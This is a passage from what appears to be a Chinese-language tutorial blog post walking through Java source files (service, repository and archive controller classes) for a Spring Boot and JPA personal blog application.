org.springframework.data.domain.Pageable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/8.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">BlogService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function">Blog <span class="title">getBlog</span><span class="params">(Long id)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Page&lt;Blog&gt; <span class="title">listBlog</span><span class="params">(Pageable pageable, BlogQuery blogQuery)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Page&lt;Blog&gt; <span class="title">listBlog</span><span class="params">(Pageable pageable)</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function">Page&lt;Blog&gt; <span class="title">listBlog</span><span class="params">(Long tagId,Pageable pageable)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Page&lt;Blog&gt; <span class="title">listBlog</span><span class="params">(String query,Pageable pageable)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Blog <span class="title">getAndConvert</span><span class="params">(Long id)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">List&lt;Blog&gt; <span class="title">listRecommendBlogTop</span><span class="params">(Integer size)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Blog <span class="title">saveBlog</span><span class="params">(Blog blog)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Blog <span class="title">updateBlog</span><span class="params">(Long id,Blog blog)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">deleteBlog</span><span class="params">(Long id)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BlogServiceImpl.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.NotFoundException;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.dao.BlogRepository;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Blog;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Type;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.util.MarkdownUtils;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.util.MyBeanUtils;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.vo.BlogQuery;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.BeanUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Page;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.PageRequest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Pageable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Sort;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.jpa.domain.Specification;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"><span class="keyword">import</span> org.springframework.transaction.annotation.Transactional;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.persistence.criteria.*;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/8.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BlogServiceImpl</span> <span class="keyword">implements</span> <span class="title">BlogService</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> BlogRepository blogRepository;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Blog <span class="title">getBlog</span><span class="params">(Long id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> blogRepository.findById(id).get();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Page&lt;Blog&gt; <span class="title">listBlog</span><span class="params">(Pageable pageable, BlogQuery blogQuery)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> blogRepository.findAll(<span class="keyword">new</span> Specification&lt;Blog&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Predicate <span class="title">toPredicate</span><span class="params">(Root&lt;Blog&gt; root, CriteriaQuery&lt;?&gt; criteriaQuery, CriteriaBuilder criteriaBuilder)</span> </span>&#123;</span><br><span class="line">                List&lt;Predicate&gt; predicateList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">                <span class="keyword">if</span> (!<span class="string">&quot;&quot;</span>.equals(blogQuery.getTitle()) &amp;&amp; blogQuery.getTitle() != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    predicateList.add(criteriaBuilder.like(root.&lt;String&gt;get(<span class="string">&quot;title&quot;</span>),<span class="string">&quot;%&quot;</span>+blogQuery.getTitle()+<span class="string">&quot;%&quot;</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (blogQuery.getTypeID() != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    predicateList.add(criteriaBuilder.equal(root.&lt;Type&gt;get(<span class="string">&quot;type&quot;</span>).get(<span class="string">&quot;id&quot;</span>),blogQuery.getTypeID()));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (blogQuery.isRecommend())&#123;</span><br><span class="line">                    predicateList.add(criteriaBuilder.equal(root.&lt;Boolean&gt;get(<span class="string">&quot;recommend&quot;</span>),blogQuery.isRecommend()));</span><br><span class="line">                &#125;</span><br><span class="line">                criteriaQuery.where(predicateList.toArray(<span class="keyword">new</span> Predicate[predicateList.size()]));</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,pageable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Page&lt;Blog&gt; <span class="title">listBlog</span><span class="params">(Pageable pageable)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> blogRepository.findAll(pageable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Page&lt;Blog&gt; <span class="title">listBlog</span><span class="params">(Long tagId, Pageable pageable)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> blogRepository.findAll(<span class="keyword">new</span> Specification&lt;Blog&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Predicate <span class="title">toPredicate</span><span class="params">(Root&lt;Blog&gt; root, CriteriaQuery&lt;?&gt; criteriaQuery, CriteriaBuilder criteriaBuilder)</span> </span>&#123;</span><br><span class="line">                Join join = root.join(<span class="string">&quot;tags&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> criteriaBuilder.equal(join.get(<span class="string">&quot;id&quot;</span>),tagId);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,pageable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Page&lt;Blog&gt; <span class="title">listBlog</span><span class="params">(String query, Pageable pageable)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> blogRepository.findByQuery(query,pageable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Blog <span class="title">getAndConvert</span><span class="params">(Long id)</span> </span>&#123;</span><br><span class="line">        Blog blog = blogRepository.findById(id).get();</span><br><span class="line">        <span class="keyword">if</span> (blog == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NotFoundException(<span class="string">&quot;博客不存在哦&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Blog b = <span class="keyword">new</span> Blog();</span><br><span class="line">        BeanUtils.copyProperties(blog,b);</span><br><span class="line">        String content = b.getContent();</span><br><span class="line">        b.setContent(MarkdownUtils.markdownToHtmlExtensions(content));</span><br><span class="line">        blogRepository.updateViews(id);</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Blog&gt; <span class="title">listRecommendBlogTop</span><span class="params">(Integer size)</span> </span>&#123;</span><br><span class="line">        Sort sort = Sort.by(Sort.Direction.DESC,<span class="string">&quot;updateTime&quot;</span>);</span><br><span class="line">        Pageable pageable = PageRequest.of(<span class="number">0</span>,size,sort);</span><br><span class="line">        <span class="keyword">return</span> blogRepository.findTop(pageable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Blog <span class="title">saveBlog</span><span class="params">(Blog blog)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (blog.getId() == <span class="keyword">null</span>)&#123;</span><br><span class="line">            blog.setCreateTime(<span class="keyword">new</span> Date());</span><br><span class="line">            blog.setUpdateTime(<span class="keyword">new</span> Date());</span><br><span class="line">            blog.setViews(<span class="number">0</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            blog.setUpdateTime(<span class="keyword">new</span> Date());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> blogRepository.save(blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Blog <span class="title">updateBlog</span><span class="params">(Long id, Blog blog)</span> </span>&#123;</span><br><span class="line">        Blog b = blogRepository.findById(id).get();</span><br><span class="line">        <span class="keyword">if</span> (b == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NotFoundException(<span class="string">&quot;管理员大大,这个博客不存在哦！～(　TロT)σ&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        BeanUtils.copyProperties(blog,b, MyBeanUtils.getNullPropertyNames(blog));</span><br><span class="line">        b.setUpdateTime(<span class="keyword">new</span> Date());</span><br><span class="line">        <span class="keyword">return</span> blogRepository.save(b);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deleteBlog</span><span class="params">(Long id)</span> </span>&#123;</span><br><span class="line">        blogRepository.deleteById(id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="归档模块处理"><a href="#归档模块处理" class="headerlink" title="归档模块处理"></a>归档模块处理</h3><p>ArchiveShowController.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.service.BlogService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.Model;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/16.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArchiveShowController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> BlogService blogService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/archives&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">archives</span><span class="params">(Model model)</span></span>&#123;</span><br><span class="line">        model.addAttribute(<span class="string">&quot;archiveMap&quot;</span>,blogService.archiveBlog());</span><br><span class="line">        model.addAttribute(<span class="string">&quot;blogCouot&quot;</span>,blogService.countBlog());</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;archives&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BlogService.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Blog;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.vo.BlogQuery;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Page;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Pageable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/8.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">BlogService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function">Blog <span class="title">getBlog</span><span class="params">(Long id)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Page&lt;Blog&gt; <span class="title">listBlog</span><span class="params">(Pageable pageable, BlogQuery blogQuery)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Page&lt;Blog&gt; <span class="title">listBlog</span><span class="params">(Pageable pageable)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Page&lt;Blog&gt; <span class="title">listBlog</span><span class="params">(Long tagId,Pageable pageable)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Page&lt;Blog&gt; <span class="title">listBlog</span><span class="params">(String query,Pageable pageable)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Blog <span class="title">getAndConvert</span><span class="params">(Long id)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">List&lt;Blog&gt; <span class="title">listRecommendBlogTop</span><span class="params">(Integer size)</span></span>;</span><br><span class="line">    </span><br><span class="line">    Map&lt;String,List&lt;Blog&gt;&gt; archiveBlog();</span><br><span class="line">    </span><br><span class="line">    <span class="function">Long <span class="title">countBlog</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Blog <span class="title">saveBlog</span><span class="params">(Blog blog)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Blog <span class="title">updateBlog</span><span class="params">(Long id,Blog blog)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">deleteBlog</span><span class="params">(Long id)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BlogServiceImpl.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.NotFoundException;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.dao.BlogRepository;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Blog;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Type;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.util.MarkdownUtils;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.util.MyBeanUtils;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.vo.BlogQuery;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.BeanUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Page;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.PageRequest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Pageable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Sort;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.jpa.domain.Specification;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"><span class="keyword">import</span> org.springframework.transaction.annotation.Transactional;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.persistence.criteria.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/8.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BlogServiceImpl</span> <span class="keyword">implements</span> <span class="title">BlogService</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> BlogRepository blogRepository;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Blog <span class="title">getBlog</span><span class="params">(Long id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> blogRepository.findById(id).get();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Page&lt;Blog&gt; <span class="title">listBlog</span><span class="params">(Pageable pageable, BlogQuery blogQuery)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> blogRepository.findAll(<span class="keyword">new</span> Specification&lt;Blog&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Predicate <span class="title">toPredicate</span><span class="params">(Root&lt;Blog&gt; root, CriteriaQuery&lt;?&gt; criteriaQuery, CriteriaBuilder criteriaBuilder)</span> </span>&#123;</span><br><span class="line">                List&lt;Predicate&gt; predicateList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">                <span class="keyword">if</span> (!<span class="string">&quot;&quot;</span>.equals(blogQuery.getTitle()) &amp;&amp; blogQuery.getTitle() != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    predicateList.add(criteriaBuilder.like(root.&lt;String&gt;get(<span class="string">&quot;title&quot;</span>),<span class="string">&quot;%&quot;</span>+blogQuery.getTitle()+<span class="string">&quot;%&quot;</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (blogQuery.getTypeID() != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    predicateList.add(criteriaBuilder.equal(root.&lt;Type&gt;get(<span class="string">&quot;type&quot;</span>).get(<span class="string">&quot;id&quot;</span>),blogQuery.getTypeID()));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (blogQuery.isRecommend())&#123;</span><br><span class="line">                    predicateList.add(criteriaBuilder.equal(root.&lt;Boolean&gt;get(<span class="string">&quot;recommend&quot;</span>),blogQuery.isRecommend()));</span><br><span class="line">                &#125;</span><br><span class="line">                criteriaQuery.where(predicateList.toArray(<span class="keyword">new</span> Predicate[predicateList.size()]));</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,pageable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Page&lt;Blog&gt; <span class="title">listBlog</span><span class="params">(Pageable pageable)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> blogRepository.findAll(pageable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Page&lt;Blog&gt; <span class="title">listBlog</span><span class="params">(Long tagId, Pageable pageable)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> blogRepository.findAll(<span class="keyword">new</span> Specification&lt;Blog&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Predicate <span class="title">toPredicate</span><span class="params">(Root&lt;Blog&gt; root, CriteriaQuery&lt;?&gt; criteriaQuery, CriteriaBuilder criteriaBuilder)</span> </span>&#123;</span><br><span class="line">                Join join = root.join(<span class="string">&quot;tags&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> criteriaBuilder.equal(join.get(<span class="string">&quot;id&quot;</span>),tagId);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,pageable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Page&lt;Blog&gt; <span class="title">listBlog</span><span class="params">(String query, Pageable pageable)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> blogRepository.findByQuery(query,pageable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Blog <span class="title">getAndConvert</span><span class="params">(Long id)</span> </span>&#123;</span><br><span class="line">        Blog blog = blogRepository.findById(id).get();</span><br><span class="line">        <span class="keyword">if</span> (blog == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NotFoundException(<span class="string">&quot;博客不存在哦&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Blog b = <span class="keyword">new</span> Blog();</span><br><span class="line">        BeanUtils.copyProperties(blog,b);</span><br><span class="line">        String content = b.getContent();</span><br><span class="line">        b.setContent(MarkdownUtils.markdownToHtmlExtensions(content));</span><br><span class="line">        blogRepository.updateViews(id);</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Blog&gt; <span class="title">listRecommendBlogTop</span><span class="params">(Integer size)</span> </span>&#123;</span><br><span class="line">        Sort sort = Sort.by(Sort.Direction.DESC,<span class="string">&quot;updateTime&quot;</span>);</span><br><span class="line">        Pageable pageable = PageRequest.of(<span class="number">0</span>,size,sort);</span><br><span class="line">        <span class="keyword">return</span> blogRepository.findTop(pageable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Map&lt;String, List&lt;Blog&gt;&gt; archiveBlog() &#123;</span><br><span class="line">        </span><br><span class="line">        List&lt;String&gt; years = blogRepository.findGroupYear();</span><br><span class="line">        Map&lt;String,List&lt;Blog&gt;&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (String year : years)&#123;</span><br><span class="line">            map.put(year,blogRepository.findByYear(year));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> map;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">countBlog</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> blogRepository.count();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Blog <span class="title">saveBlog</span><span class="params">(Blog blog)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (blog.getId() == <span class="keyword">null</span>)&#123;</span><br><span class="line">            blog.setCreateTime(<span class="keyword">new</span> Date());</span><br><span class="line">            blog.setUpdateTime(<span class="keyword">new</span> Date());</span><br><span class="line">            blog.setViews(<span class="number">0</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            blog.setUpdateTime(<span class="keyword">new</span> Date());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> blogRepository.save(blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Blog <span class="title">updateBlog</span><span class="params">(Long id, Blog blog)</span> </span>&#123;</span><br><span class="line">        Blog b = blogRepository.findById(id).get();</span><br><span class="line">        <span class="keyword">if</span> (b == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NotFoundException(<span class="string">&quot;管理员大大,这个博客不存在哦！～(　TロT)σ&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        BeanUtils.copyProperties(blog,b, MyBeanUtils.getNullPropertyNames(blog));</span><br><span class="line">        b.setUpdateTime(<span class="keyword">new</span> Date());</span><br><span class="line">        <span class="keyword">return</span> blogRepository.save(b);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deleteBlog</span><span class="params">(Long id)</span> </span>&#123;</span><br><span class="line">        blogRepository.deleteById(id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BlogRepository.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Blog;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Page;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Pageable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.jpa.repository.JpaRepository;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.jpa.repository.JpaSpecificationExecutor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.jpa.repository.Modifying;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.jpa.repository.Query;</span><br><span class="line"><span class="keyword">import</span> org.springframework.transaction.annotation.Transactional;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/8.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">BlogRepository</span> <span class="keyword">extends</span> <span class="title">JpaRepository</span>&lt;<span class="title">Blog</span>,<span class="title">Long</span>&gt;, <span class="title">JpaSpecificationExecutor</span>&lt;<span class="title">Blog</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Query(&quot;select b from Blog b where b.recommend = true&quot;)</span></span><br><span class="line">    <span class="function">List&lt;Blog&gt; <span class="title">findTop</span><span class="params">(Pageable pageable)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//select * from t_blog where title like &#x27;%内容%&#x27;</span></span><br><span class="line">    <span class="meta">@Query(&quot;select b from Blog b where b.title like ?1 or b.content like ?1&quot;)</span></span><br><span class="line">    <span class="function">Page&lt;Blog&gt; <span class="title">findByQuery</span><span class="params">(String query,Pageable pageable)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Modifying</span></span><br><span class="line">    <span class="meta">@Query(&quot;update Blog b set b.views = b.views+1 where b.id = ?1&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">updateViews</span><span class="params">(Long id)</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Query(&quot;select function(&#x27;date_format&#x27;,b.updateTime,&#x27;%Y&#x27;) as year from Blog b group by function(&#x27;date_format&#x27;,b.updateTime,&#x27;%Y&#x27;) order by function(&#x27;date_format&#x27;,b.updateTime,&#x27;%Y&#x27;) desc &quot;)</span></span><br><span class="line">    <span class="function">List&lt;String&gt; <span class="title">findGroupYear</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="meta">@Query(&quot;select b from Blog b where function(&#x27;date_format&#x27;,b.updateTime,&#x27;%Y&#x27;) = ?1&quot;)</span></span><br><span class="line">    <span class="function">List&lt;Blog&gt; <span class="title">findByYear</span><span class="params">(String year)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="个人模块处理"><a href="#个人模块处理" 